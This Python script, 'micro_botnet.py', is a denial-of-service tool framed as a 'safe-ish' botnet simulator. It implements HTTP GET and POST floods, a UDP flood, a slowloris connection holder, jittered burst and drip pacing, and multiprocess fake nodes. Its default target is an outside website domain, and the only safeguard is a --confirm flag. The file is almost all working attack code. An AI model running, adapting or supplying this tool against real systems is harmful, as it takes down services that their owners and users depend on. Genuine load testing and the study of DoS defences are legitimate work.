#!/usr/bin/env python3
"""
micro_botnet.py
Safe-ish micro botnet simulator for learning / testing (ONLY against servers you own).

Modes:
  --http-get      : async HTTP GET flood
  --http-post     : async HTTP POST flood (payload provided)
  --slowloris     : slowloris-style connection-holder
  --udp-flood     : UDP packet flood
  --mixed         : combine GET/POST/UDP concurrently (learn botnet patterns)
  --spawn-nodes   : spawn multiple local processes to simulate distributed nodes

Attack-style patterns (--attack-style):
  slowloris : hold many open connections and send periodic keep-alive headers
  rapid     : minimal delay between requests (very high velocity)
  burst     : send groups of requests (bursts) then pause
  drip      : low steady rate over time (simulates slow bleed)
  mixed     : mix of the above patterns randomly per worker

Safety:
  - Requires --confirm to actually run.
  - Defaults are conservative; increase slowly.
"""

import argparse
import asyncio
import aiohttp
import random
import string
import time
import socket
import sys
from multiprocessing import Process

DEFAULT_TARGET = "https://booknerdsociety.com"  # put your site here
USER_AGENT = "MicroBotSim/0.2"

# -------------------------
# Utilities
# -------------------------
def rand_payload(sz=64):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=sz))

def print_header(msg):
    print("" + "="*8 + " " + msg + " " + "="*8)

def jitter(base, jitter_fraction=0.2):
    """Return a jittered delay based on base seconds."""
    if base <= 0:
        return 0
    frac = base * jitter_fraction
    return max(0.0, random.uniform(base-frac, base+frac))

# -------------------------
# Attack pattern helpers
# -------------------------
class PatternConfig:
    """Encapsulate attack-style behavior parameters."""
    def __init__(self, style="rapid", **kwargs):
        self.style = style
        # base values (conservative)
        self.rapid_delay = kwargs.get('rapid_delay', 0.001)    # seconds between requests
        self.burst_size = kwargs.get('burst_size', 50)        # requests in one burst
        self.burst_pause = kwargs.get('burst_pause', 1.0)     # pause after a burst
        self.drip_delay = kwargs.get('drip_delay', 0.5)       # steady delay for drip
        self.slowloris_send_interval = kwargs.get('slowloris_send_interval', 10.0)
        self.slowloris_hold = kwargs.get('slowloris_hold', 60)
        # jitter multipliers help avoid perfectly synchronized behavior
        self.jitter_fraction = kwargs.get('jitter_fraction', 0.2)

    def next_delay(self):
        if self.style == 'rapid':
            return jitter(self.rapid_delay, self.jitter_fraction)
        elif self.style == 'burst':
            # zero delay within a burst; caller manages burst boundaries
            return 0
        elif self.style == 'drip':
            return jitter(self.drip_delay, self.jitter_fraction)
        elif self.style == 'slowloris':
            # HTTP workers shouldn't use slowloris delay; slowloris has its own worker
            return jitter(0.1, self.jitter_fraction)
        elif self.style == 'mixed':
            # pick random style per request
            choice = random.choice(['rapid','burst','drip'])
            return PatternConfig(choice).next_delay()
        else:
            return jitter(0.01, self.jitter_fraction)

# -------------------------
# HTTP GET worker (async) with attack-style patterns
# -------------------------
async def http_get_worker(session, target, requests_per_worker, pattern: PatternConfig):
    succ = 0
    fail = 0

    if pattern.style == 'burst':
        # implement bursts: send burst_size requests quickly, then pause
        sent = 0
        while sent < requests_per_worker:
            burst = min(pattern.burst_size, requests_per_worker - sent)
            tasks = []
            for _ in range(burst):
                tasks.append(session.get(target))
            # fire all and wait
            for t in asyncio.as_completed(tasks):
                try:
                    resp = await t
                    async with resp:
                        if 200 <= resp.status < 400:
                            succ += 1
                        else:
                            fail += 1
                except Exception:
                    fail += 1
            sent += burst
            # pause after burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    # rapid/drip/mixed styles (per-request delays)
    for _ in range(requests_per_worker):
        try:
            async with session.get(target, timeout=15) as resp:
                if 200 <= resp.status < 400:
                    succ += 1
                else:
                    fail += 1
        except Exception:
            fail += 1

        # apply pattern delay
        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)

    return succ, fail

# -------------------------
# HTTP POST worker (async) with attack-style patterns
# -------------------------
async def http_post_worker(session, target, requests_per_worker, pattern: PatternConfig, payload_size=64):
    succ = 0
    fail = 0

    if pattern.style == 'burst':
        sent = 0
        while sent < requests_per_worker:
            burst = min(pattern.burst_size, requests_per_worker - sent)
            tasks = []
            for _ in range(burst):
                data = {"data": rand_payload(payload_size)}
                tasks.append(session.post(target, json=data))
            for t in asyncio.as_completed(tasks):
                try:
                    resp = await t
                    async with resp:
                        if 200 <= resp.status < 400:
                            succ += 1
                        else:
                            fail += 1
                except Exception:
                    fail += 1
            sent += burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    for _ in range(requests_per_worker):
        try:
            data = {"data": rand_payload(payload_size)}
            async with session.post(target, json=data, timeout=15) as resp:
                if 200 <= resp.status < 400:
                    succ += 1
                else:
                    fail += 1
        except Exception:
            fail += 1

        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)

    return succ, fail

# -------------------------
# UDP flood (async)
# -------------------------
async def udp_worker(target_host, target_port, packets_per_worker, pattern: PatternConfig, payload_size):
    succ = 0
    fail = 0
    loop = asyncio.get_running_loop()

    # pattern affects pacing
    if pattern.style == 'burst':
        # send bursts
        sent = 0
        while sent < packets_per_worker:
            burst = min(pattern.burst_size, packets_per_worker - sent)
            for _ in range(burst):
                try:
                    data = rand_payload(payload_size).encode()
                    await loop.run_in_executor(None, lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (target_host, target_port)))
                    succ += 1
                except Exception:
                    fail += 1
            sent += burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    for _ in range(packets_per_worker):
        try:
            data = rand_payload(payload_size).encode()
            await loop.run_in_executor(None, lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (target_host, target_port)))
            succ += 1
        except Exception:
            fail += 1
        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)
    return succ, fail

# -------------------------
# Slowloris-style worker (sync)
# -------------------------
def slowloris_worker_sync(target_host, target_port, sockets_per_worker, hold_time, send_interval):
    sockets = []
    created = 0
    try:
        for _ in range(sockets_per_worker):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_host, target_port))
            # send initial partial GET headers
            s.sendall(b"GET / HTTP/1.1")
            s.sendall(f"Host: {target_host}".encode())
            s.sendall(f"User-Agent: {USER_AGENT}".encode())
            # don't finish headers, keep sending keep-alives
            sockets.append(s)
            created += 1
        # keep sockets alive for hold_time seconds
        t0 = time.time()
        while time.time() - t0 < hold_time:
            for s in sockets[:]:
                try:
                    s.sendall(b"X-Keep-Alive: %d" % random.randint(1, 1000))
                except Exception:
                    try:
                        s.close()
                    except:
                        pass
                    sockets.remove(s)
            time.sleep(send_interval)
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    return created, len(sockets)

# -------------------------
# Async runner helpers
# -------------------------
async def run_http_get(target, concurrency, requests_per_worker, pattern_cfg):
    headers = {"User-Agent": USER_AGENT}
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session:
        tasks = [http_get_worker(session, target, requests_per_worker, pattern_cfg) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

async def run_http_post(target, concurrency, requests_per_worker, pattern_cfg, payload_size):
    headers = {"User-Agent": USER_AGENT, "Content-Type": "application/json"}
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session:
        tasks = [http_post_worker(session, target, requests_per_worker, pattern_cfg, payload_size) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

async def run_udp(target_host, target_port, concurrency, packets_per_worker, pattern_cfg, payload_size):
    tasks = [udp_worker(target_host, target_port, packets_per_worker, pattern_cfg, payload_size) for _ in range(concurrency)]
    results = await asyncio.gather(*tasks)
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

# -------------------------
# Mixed routine (async) - understands attack-style patterns
# -------------------------
async def run_mixed(**kwargs):
    # resolve options flexibly
    target = kwargs.get("target_http") or kwargs.get("target") or kwargs.get("target_url") or DEFAULT_TARGET

    total_conc = kwargs.get("concurrency", kwargs.get("http_concurrency", kwargs.get("http_conc", 50)))
    http_conc = kwargs.get("http_conc") or kwargs.get("http_concurrency") or max(1, total_conc // 2)
    post_conc = kwargs.get("post_conc") or max(1, total_conc - http_conc)
    udp_conc = kwargs.get("udp_conc") or max(1, total_conc // 4)

    http_reqs = kwargs.get("http_reqs") or kwargs.get("requests_per_worker") or 10
    post_reqs = kwargs.get("post_reqs") or kwargs.get("requests_per_worker") or 10

    http_delay = kwargs.get("http_delay") or kwargs.get("delay") or 0.02
    post_delay = kwargs.get("post_delay") or kwargs.get("delay") or 0.02

    post_payload = kwargs.get("post_payload") or kwargs.get("payload_size") or 64

    udp_host = kwargs.get("udp_host") or kwargs.get("host") or "127.0.0.1"
    udp_port = kwargs.get("udp_port") or kwargs.get("port") or 80
    udp_pkts = kwargs.get("udp_pkts") or kwargs.get("packets_per_worker") or kwargs.get("udp_packets_per_worker") or 20
    udp_delay = kwargs.get("udp_delay") or kwargs.get("delay") or 0.02
    udp_payload = kwargs.get("udp_payload") or kwargs.get("payload_size") or 64

    # pattern
    attack_style = kwargs.get('attack_style') or kwargs.get('pattern') or 'mixed'
    pattern_cfg = PatternConfig(style=attack_style)

    tasks = []
    headers = {"User-Agent": USER_AGENT}
    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session:
        # GET tasks
        for _ in range(http_conc):
            tasks.append(http_get_worker(session, target, http_reqs, pattern_cfg))
        # POST tasks
        for _ in range(post_conc):
            tasks.append(http_post_worker(session, target, post_reqs, pattern_cfg, post_payload))

        if tasks:
            http_results = await asyncio.gather(*tasks)
        else:
            http_results = []

    udp_res = await run_udp(udp_host, udp_port, udp_conc, udp_pkts, pattern_cfg, udp_payload)

    succ_http = sum(r[0] for r in http_results) if http_results else 0
    fail_http = sum(r[1] for r in http_results) if http_results else 0

    return succ_http, fail_http, udp_res[0], udp_res[1]

# -------------------------
# Distributed-local (multiprocessing)
# -------------------------
def spawn_local_nodes(n, mode, kwargs_per_node):
    procs = []
    for i in range(n):
        p = Process(target=worker_process_entry, args=(mode, kwargs_per_node, i))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()

def worker_process_entry(mode, kwargs, node_id):
    print_header(f"Node {node_id} starting (PID {os_getpid()}) - mode: {mode}")
    try:
        attack_style = kwargs.get('attack_style') or kwargs.get('pattern') or 'mixed'
        pattern_cfg = PatternConfig(style=attack_style)

        if mode == "http-get":
            target = kwargs.get("target", DEFAULT_TARGET)
            concurrency = kwargs.get("concurrency", 50)
            requests_per_worker = kwargs.get("requests_per_worker", 10)
            asyncio.run(main_http_get(target=target, concurrency=concurrency, requests_per_worker=requests_per_worker, pattern_cfg=pattern_cfg))

        elif mode == "http-post":
            target = kwargs.get("target", DEFAULT_TARGET)
            concurrency = kwargs.get("concurrency", 50)
            requests_per_worker = kwargs.get("requests_per_worker", 10)
            payload_size = kwargs.get("payload_size", 64)
            asyncio.run(main_http_post(target=target, concurrency=concurrency, requests_per_worker=requests_per_worker, pattern_cfg=pattern_cfg, payload_size=payload_size))

        elif mode in ("slowloris",):
            host = kwargs.get("host", "127.0.0.1")
            port = kwargs.get("port", 80)
            sockets_per_worker = kwargs.get("sockets_per_worker", 10)
            hold_time = kwargs.get("hold_time", pattern_cfg.slowloris_hold)
            send_interval = kwargs.get("send_interval", pattern_cfg.slowloris_send_interval)
            created, remaining = slowloris_worker_sync(host, port, sockets_per_worker, hold_time, send_interval)
            print(f"Slowloris created {created} sockets; remaining open sockets {remaining}")

        elif mode in ("udp-flood", "udp"):
            host = kwargs.get("host", "127.0.0.1")
            port = kwargs.get("port", 80)
            concurrency = kwargs.get("concurrency", 50)
            packets_per_worker = kwargs.get("packets_per_worker", kwargs.get("udp_packets_per_worker", 20))
            payload_size = kwargs.get("payload_size", 64)
            asyncio.run(run_udp(host, port, concurrency, packets_per_worker, pattern_cfg, payload_size))

        elif mode == "mixed":
            asyncio.run(run_mixed(**{**kwargs, 'attack_style': attack_style}))

        else:
            print(f"Unknown mode: {mode}")
    except Exception as e:
        print(f"Node {node_id} encountered an error: {e}")
    finally:
        print_header(f"Node {node_id} finished")

# small helper to avoid importing os huge
def os_getpid():
    try:
        import os
        return os.getpid()
    except:
        return -1

# -------------------------
# Main synchronous wrappers for process targets
# -------------------------
async def main_http_get(target, concurrency, requests_per_worker, pattern_cfg):
    print_header("HTTP GET flood")
    t0 = time.time()
    succ, fail = await run_http_get(target, concurrency, requests_per_worker, pattern_cfg)
    elapsed = time.time() - t0
    print(f"Done in {elapsed:.2f}s - GET success={succ} fail={fail} total={succ+fail}")

async def main_http_post(target, concurrency, requests_per_worker, pattern_cfg, payload_size):
    print_header("HTTP POST flood")
    t0 = time.time()
    succ, fail = await run_http_post(target, concurrency, requests_per_worker, pattern_cfg, payload_size)
    elapsed = time.time() - t0
    print(f"Done in {elapsed:.2f}s - POST success={succ} fail={fail} total={succ+fail}")

# -------------------------
# CLI and orchestrator
# -------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Micro botnet simulator (for legal testing only).")
    p.add_argument("--mode", choices=["http-get","http-post","slowloris","udp-flood","mixed","spawn-nodes"], default="http-get")
    p.add_argument("--target", default=DEFAULT_TARGET, help="Target URL for HTTP modes (include http/https).")
    p.add_argument("--host", default="booknerdsociety.com", help="Target host for UDP/slowloris (hostname or IP).")
    p.add_argument("--port", type=int, default=80, help="Target port for slowloris/udp (default 80).")
    p.add_argument("--concurrency", type=int, default=50, help="Number of concurrent workers (async tasks).")
    p.add_argument("--requests-per-worker", type=int, default=10, help="Requests per worker.")
    p.add_argument("--delay", type=float, default=0.02, help="Delay between requests in seconds (per worker).")
    p.add_argument("--payload-size", type=int, default=64, help="Size of random payload for POST/UDP.")
    p.add_argument("--udp-packets-per-worker", type=int, default=20, help="UDP packets per worker.")
    p.add_argument("--sockets-per-worker", type=int, default=50, help="Sockets per worker for slowloris (use small numbers!).")
    p.add_argument("--hold-time", type=int, default=60, help="How long slowloris holds sockets (seconds).")
    p.add_argument("--send-interval", type=float, default=10.0, help="Interval between slowloris keep-alive sends (seconds).")
    p.add_argument("--nodes", type=int, default=1, help="Number of local nodes to spawn (spawn-nodes mode)")
    p.add_argument("--attack-style", choices=["slowloris","rapid","burst","drip","mixed"], default="mixed", help="Attack-style pattern to apply per worker.")
    p.add_argument("--burst-size", type=int, default=50, help="Burst size for burst-style attacks.")
    p.add_argument("--burst-pause", type=float, default=1.0, help="Pause after each burst (seconds).")
    p.add_argument("--rapid-delay", type=float, default=0.001, help="Base per-request delay for rapid style (seconds).")
    p.add_argument("--drip-delay", type=float, default=0.5, help="Base per-request delay for drip style (seconds).")
    p.add_argument("--confirm", action="store_true", help="Required to actually run load. Safety switch.")
    return p.parse_args()


def main():
    args = parse_args()
    if not args.confirm:
        print("Safety check: add --confirm to actually run the attack simulation. Exiting.")
        sys.exit(0)

    print_header(f"Mode: {args.mode}")

    # build pattern config
    pattern_kwargs = {
        'rapid_delay': args.rapid_delay,
        'burst_size': args.burst_size,
        'burst_pause': args.burst_pause,
        'drip_delay': args.drip_delay
    }
    attack_style = args.attack_style

    # route modes
    if args.mode == "http-get":
        pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
        asyncio.run(main_http_get(target=args.target, concurrency=args.concurrency, requests_per_worker=args.requests_per_worker, pattern_cfg=pattern_cfg))

    elif args.mode == "http-post":
        pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
        asyncio.run(main_http_post(target=args.target, concurrency=args.concurrency, requests_per_worker=args.requests_per_worker, pattern_cfg=pattern_cfg, payload_size=args.payload_size))

    elif args.mode == "udp-flood":
        pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
        target_host = args.host
        asyncio.run(run_udp(target_host, args.port, args.concurrency, args.udp_packets_per_worker, pattern_cfg, args.payload_size))

    elif args.mode == "slowloris":
        created, remaining = slowloris_worker_sync(args.host, args.port, args.sockets_per_worker, args.hold_time, args.send_interval)
        print(f"Slowloris created {created} sockets; remaining open sockets {remaining}")

    elif args.mode == "mixed":
        # split concurrency between GET and POST and spawn UDP too
        pattern_cfg = PatternConfig(style=attack_style, **pattern_kwargs)
        http_conc = max(1, args.concurrency // 2)
        post_conc = max(1, args.concurrency - http_conc)
        udp_conc = max(1, args.concurrency // 4)
        asyncio.run(run_mixed(
            target_http=args.target, http_conc=http_conc, http_reqs=args.requests_per_worker, http_delay=args.delay,
            post_conc=post_conc, post_reqs=args.requests_per_worker, post_delay=args.delay, post_payload=args.payload_size,
            udp_host=args.host, udp_port=args.port, udp_conc=udp_conc, udp_pkts=args.udp_packets_per_worker, udp_delay=args.delay, udp_payload=args.payload_size,
            attack_style=attack_style
        ))

    elif args.mode == "spawn-nodes":
        kwargs = {
            'target': args.target,
            'concurrency': args.concurrency,
            'requests_per_worker': args.requests_per_worker,
            'delay': args.delay,
            'payload_size': args.payload_size,
            'host': args.host,
            'port': args.port,
            'packets_per_worker': args.udp_packets_per_worker,
            'udp_packets_per_worker': args.udp_packets_per_worker,
            'attack_style': attack_style,
            'burst_size': args.burst_size,
            'burst_pause': args.burst_pause,
            'rapid_delay': args.rapid_delay,
            'drip_delay': args.drip_delay
        }
        spawn_local_nodes(args.nodes, "mixed", kwargs)

if __name__ == "__main__":
    main()
